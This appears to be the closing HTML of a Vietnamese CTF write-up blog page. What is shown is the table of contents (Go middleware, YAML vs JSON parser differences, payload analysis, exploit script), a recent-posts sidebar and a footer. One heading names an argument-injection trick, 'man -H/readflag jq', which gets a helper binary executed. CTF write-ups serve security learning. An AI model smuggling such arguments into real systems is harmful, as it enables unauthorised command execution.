thiệu</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Co-che-ung-dung-va-middleware"><span class="toc-number">2.</span> <span class="toc-text">Cơ chế ứng dụng và middleware</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Handler-xu-ly-lenh"><span class="toc-number">3.</span> <span class="toc-text">Handler xử lý lệnh</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Khac-biet-giua-JSON-va-YAML-parser-trong-Go"><span class="toc-number">4.</span> <span class="toc-text">Khác biệt giữa JSON và YAML parser trong Go</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Phan-tich-payload-tan-cong"><span class="toc-number">5.</span> <span class="toc-text">Phân tích payload tấn công</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Buoc-1-Middleware-YAML-parse"><span class="toc-number">5.1.</span> <span class="toc-text">Bước 1: Middleware (YAML parse)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Buoc-2-Handler-JSON-parse"><span class="toc-number">5.2.</span> <span class="toc-text">Bước 2: Handler (JSON parse)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Tai-sao-man-H-readflag-jq-doc-duoc-flag"><span class="toc-number">6.</span> <span class="toc-text">Tại sao man -H&#x2F;readflag jq đọc được flag?</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Script-khai-thac"><span class="toc-number">7.</span> <span class="toc-text">Script khai thác</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Ket-luan"><span class="toc-number">8.</span> <span class="toc-text">Kết luận</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/02/16/2026/ctf/lactf/wu/" title="LA CTF 2026"><img src="/img/ctf/lactf/poster.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="LA CTF 2026"/></a><div class="content"><a class="title" href="/2026/02/16/2026/ctf/lactf/wu/" title="LA CTF 2026">LA CTF 2026</a><time datetime="2026-02-16T06:33:16.000Z" title="Created 2026-02-16 13:33:16">2026-02-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/02/16/2026/ctf/0xfun/wu/" title="Writeup: 0xFun CTF 2026"><img src="/img/ctf/0xfun/poster.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Writeup: 0xFun CTF 2026"/></a><div class="content"><a class="title" href="/2026/02/16/2026/ctf/0xfun/wu/" title="Writeup: 0xFun CTF 2026">Writeup: 0xFun CTF 2026</a><time datetime="2026-02-16T02:32:18.000Z" title="Created 2026-02-16 09:32:18">2026-02-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/19/2026/ctf/uof/wu/" title="Writeup: Uof CTF 2026"><img src="/img/ctf/uof/poster.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Writeup: Uof CTF 2026"/></a><div class="content"><a class="title" href="/2026/01/19/2026/ctf/uof/wu/" title="Writeup: Uof CTF 2026">Writeup: Uof CTF 2026</a><time datetime="2026-01-19T09:21:56.000Z" title="Created 2026-01-19 16:21:56">2026-01-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/18/Research/web/flask-bin/" title="Research: Bypass Werkzeug Debug PIN"><img src="/img/research/web/poster.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Research: Bypass Werkzeug Debug PIN"/></a><div class="content"><a class="title" href="/2026/01/18/Research/web/flask-bin/" title="Research: Bypass Werkzeug Debug PIN">Research: Bypass Werkzeug Debug PIN</a><time datetime="2026-01-18T13:31:56.000Z" title="Created 2026-01-18 20:31:56">2026-01-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/14/2025/ctf/asisctf/wu/" title="Writeup: ASIS CTF 2025"><img src="/img/ctf/asis/poster.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Writeup: ASIS CTF 2025"/></a><div class="content"><a class="title" href="/2026/01/14/2025/ctf/asisctf/wu/" title="Writeup: ASIS CTF 2025">Writeup: ASIS CTF 2025</a><time datetime="2026-01-14T08:07:34.000Z" title="Created 2026-01-14 15:07:34">2026-01-14</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/ctf/lactf/poster.png);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By H00d1eBl4ck</span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="1" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>